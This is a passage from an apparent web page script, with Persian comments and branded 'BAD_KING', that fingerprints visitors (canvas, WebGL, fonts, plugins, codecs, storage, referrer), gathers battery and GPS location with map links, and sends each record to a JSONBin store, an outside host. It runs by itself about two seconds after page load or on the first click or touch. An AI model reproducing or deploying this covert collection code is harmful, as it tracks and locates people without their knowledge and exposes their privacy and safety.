            return {h264:v.canPlayType('video/mp4; codecs="avc1.42E01E"')||'خیر',h264High:v.canPlayType('video/mp4; codecs="avc1.64001E"')||'خیر',h265:v.canPlayType('video/mp4; codecs="hev1.1.6.L93.B0"')||'خیر',vp8:v.canPlayType('video/webm; codecs="vp8"')||'خیر',vp9:v.canPlayType('video/webm; codecs="vp9"')||'خیر',av1:v.canPlayType('video/mp4; codecs="av01.0.05M.08"')||'خیر',mp3:a.canPlayType('audio/mpeg')||'خیر',aac:a.canPlayType('audio/mp4; codecs="mp4a.40.2"')||'خیر',ogg:a.canPlayType('audio/ogg')||'خیر',wav:a.canPlayType('audio/wav')||'خیر',flac:a.canPlayType('audio/flac')||'خیر',opus:a.canPlayType('audio/opus')||'خیر',webm:v.canPlayType('video/webm')||'خیر',mp4:v.canPlayType('video/mp4')||'خیر',ogv:v.canPlayType('video/ogg')||'خیر'};
        }

        // ================================================================
        // 10. فونت‌ها و پلاگین‌ها
        // ================================================================
        function getFonts(){
            const list=['Arial','Times New Roman','Helvetica','Calibri','Verdana','Tahoma','IRANSans','Vazir','Yekan','B Nazanin','Comic Sans MS','Courier New','Georgia','Impact','Roboto','Open Sans','Lato','Montserrat','Segoe UI','Trebuchet MS'];const avail=[];for(const f of list){try{const span=document.createElement('span');span.style.fontFamily=f+', sans-serif';span.style.position='absolute';span.style.left='-9999px';span.textContent='test';document.body.appendChild(span);if(span.offsetWidth>0) avail.push(f);document.body.removeChild(span);}catch(e){}}return avail;
        }
        function getPlugins(){const p=[];try{for(let i=0;i<navigator.plugins.length;i++){p.push(navigator.plugins[i].name);}}catch(e){}return p;}

        // ================================================================
        // 11. اثر انگشت (3 مورد)
        // ================================================================
        function getFingerprints(){
            const result={canvas:'نامشخص',webgl:'نامشخص',font:'نامشخص'};
            try{const c=document.createElement('canvas');c.width=400;c.height=100;const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃',4,17);ctx.fillStyle='#f00';ctx.fillRect(0,0,400,100);ctx.fillStyle='#0f0';ctx.fillRect(10,10,380,80);ctx.fillStyle='#00f';ctx.fillRect(20,20,360,60);ctx.strokeStyle='#fff';ctx.lineWidth=2;ctx.strokeRect(30,30,340,40);result.canvas=c.toDataURL().substring(0,50)+'...';}catch(e){}
            try{const c=document.createElement('canvas');c.width=200;c.height=50;const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){const ext=gl.getExtension('WEBGL_debug_renderer_info');if(ext){result.webgl=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)+' | '+gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);}}}catch(e){}
            try{const fonts=getFonts();result.font=fonts.join(', ').substring(0,100)+'...';}catch(e){}
            return result;
        }

        // ================================================================
        // 12. تعامل با سایت (10 مورد)
        // ================================================================
        function getInteractionInfo(){
            let lt='نامشخص',dlt='نامشخص',dit='نامشخص',dclt='نامشخص';try{if(performance.timing){const n=performance.timing;lt=(n.loadEventEnd-n.navigationStart)+' ms';dlt=(n.domComplete-n.domLoading)+' ms';dit=(n.domInteractive-n.navigationStart)+' ms';dclt=(n.domContentLoadedEventEnd-n.navigationStart)+' ms';}}catch(e){}
            let mi='نامشخص';try{if(performance.memory){mi=Math.round(performance.memory.usedJSHeapSize/1024/1024)+' MB / '+Math.round(performance.memory.totalJSHeapSize/1024/1024)+' MB';}}catch(e){}
            let nt='نامشخص',rc=0;try{if(performance.navigation){const types={0:'کلیک/تایپ',1:'رفرش',2:'بازگشت',255:'سایر'};nt=types[performance.navigation.type]||'نامشخص';rc=performance.navigation.redirectCount||0;}}catch(e){}
            return {loadTime:lt,domLoadTime:dlt,domInteractiveTime:dit,domContentLoadedTime:dclt,memoryInfo:mi,navigationType:nt,redirectCount:rc,visibilityState:document.visibilityState,hasFocus:document.hasFocus()?'بله':'خیر',referrer:document.referrer||'مستقیم',url:window.location.href,hostname:window.location.hostname,pathname:window.location.pathname,protocol:window.location.protocol,port:window.location.port||'80'};
        }

        // ================================================================
        // 13. ذخیره‌سازی (6 مورد)
        // ================================================================
        function getStorageInfo(){
            let ls='نامشخص',ss='نامشخص';let lc=0,sc=0;
            try{let total=0;for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);if(key){total+=localStorage.getItem(key).length;lc++;}}ls=Math.round(total/1024)+' KB';}catch(e){}
            try{let total=0;for(let i=0;i<sessionStorage.length;i++){const key=sessionStorage.key(i);if(key){total+=sessionStorage.getItem(key).length;sc++;}}ss=Math.round(total/1024)+' KB';}catch(e){}
            return {localStorageSize:ls,localStorageCount:lc,sessionStorageSize:ss,sessionStorageCount:sc};
        }

        // ================================================================
        // 14. ارسال به JSONBin
        // ================================================================
        async function sendToJSONBin(data){
            try{const get=await fetch('https://api.jsonbin.io/v3/b/'+JSONBIN_BIN_ID,{headers:{'X-Master-Key':JSONBIN_API_KEY}});if(!get.ok) throw new Error('خطا');const result=await get.json();const visits=result.record.visits||[];visits.unshift(data);if(visits.length>200) visits=visits.slice(0,200);const put=await fetch('https://api.jsonbin.io/v3/b/'+JSONBIN_BIN_ID,{method:'PUT',headers:{'Content-Type':'application/json','X-Master-Key':JSONBIN_API_KEY},body:JSON.stringify({visits:visits})});if(put.ok){console.log('✅ ارسال به JSONBin');return true;}else{return false;}}catch(e){console.error('❌',e);return false;}
        }

        function saveLocal(data){try{let v=JSON.parse(localStorage.getItem('badking_visits')||'[]');v.unshift(data);if(v.length>200) v=v.slice(0,200);localStorage.setItem('badking_visits',JSON.stringify(v));return true;}catch(e){return false;}}

        // ================================================================
        // 15. جمع‌آوری و ارسال
        // ================================================================
        async function collectAndSend(){
            try{
                const time=getTimeInfo();const device=getDeviceInfo();const screen=getScreenInfo();const hardware=getHardwareInfo();const network=getNetworkInfo();const capabilities=getCapabilities();const codecs=getCodecs();const fonts=getFonts();const plugins=getPlugins();const fingerprints=getFingerprints();const interaction=getInteractionInfo();const storage=getStorageInfo();const battery=await getBatteryInfo();const location=await getLocationInfo();
                const data={...time,deviceType:device.deviceType,deviceModel:device.deviceModel,deviceVendor:device.deviceVendor,isMobile:device.isMobile,os:device.os,browser:device.browser+' v'+device.browserVer,browserEngine:device.engine,architecture:device.architecture,cpuType:device.cpuType,platform:device.platform,vendor:device.vendor,memory:device.memory,cores:device.cores,screen:screen.screenWidth+'x'+screen.screenHeight,colorDepth:screen.colorDepth,pixelRatio:screen.pixelRatio,refreshRate:screen.refreshRate,orientation:screen.orientation,hdrSupport:screen.hdrSupport,wideColorGamut:screen.wideColorGamut,winSize:screen.winWidth+'x'+screen.winHeight,vram:hardware.vram,gpuVendor:hardware.gpuVendor,gpuRenderer:hardware.gpuRenderer,hwAcceleration:hardware.hwAcceleration,webgl2Support:hardware.webgl2Support,maxTextureSize:hardware.maxTextureSize,privateMode:hardware.privateMode,cookie:hardware.cookie,doNotTrack:hardware.doNotTrack,onLine:hardware.onLine,touch:hardware.touch+' ('+hardware.touchPoints+' نقطه)',networkType:network.type,networkSpeed:network.downlink,networkRtt:network.rtt,networkSaveData:network.saveData,battery:battery?battery.level:'نامشخص',batteryCharging:battery?battery.charging:'نامشخص',...capabilities,...codecs,fonts:fonts.join(', '),plugins:plugins.join(', '),fingerprint:fingerprints.canvas,webglFingerprint:fingerprints.webgl,fontFingerprint:fingerprints.font,gps:location?location.lat+', '+location.lng:'نامشخص',gpsAcc:location?location.acc:'نامشخص',gpsAlt:location?location.alt:'نامشخص',gpsHeading:location?location.heading:'نامشخص',gpsSpeed:location?location.speed:'نامشخص',mapGoogle:location?location.mapGoogle:'نامشخص',mapOSM:location?location.mapOSM:'نامشخص',mapWaze:location?location.mapWaze:'نامشخص',mapBing:location?location.mapBing:'نامشخص',loadTime:interaction.loadTime,domLoadTime:interaction.domLoadTime,domInteractiveTime:interaction.domInteractiveTime,domContentLoadedTime:interaction.domContentLoadedTime,memoryInfo:interaction.memoryInfo,navigationType:interaction.navigationType,redirectCount:interaction.redirectCount,visibilityState:interaction.visibilityState,hasFocus:interaction.hasFocus,referrer:interaction.referrer,url:interaction.url,hostname:interaction.hostname,protocol:interaction.protocol,port:interaction.port,localStorageSize:storage.localStorageSize,localStorageCount:storage.localStorageCount,sessionStorageSize:storage.sessionStorageSize,sessionStorageCount:storage.sessionStorageCount,language:navigator.language,languages:navigator.languages.join(', ')};
                const result=await sendToJSONBin(data);if(result){showToast('✅ اطلاعات ذخیره شد');}else{saveLocal(data);showToast('✅ اطلاعات در دستگاه ذخیره شد');}
            }catch(e){console.error('❌',e);showToast('❌ خطا');}
        }

        let hasRun=false;function start(){if(!hasRun){hasRun=true;collectAndSend();}}
        setTimeout(start,2000);document.addEventListener('click',start);document.addEventListener('touchstart',start);
        document.querySelectorAll('.social-item').forEach(i=>{i.addEventListener('click',()=>{setTimeout(collectAndSend,500);});});
        console.log('✅ BAD_KING page loaded');
    </script>
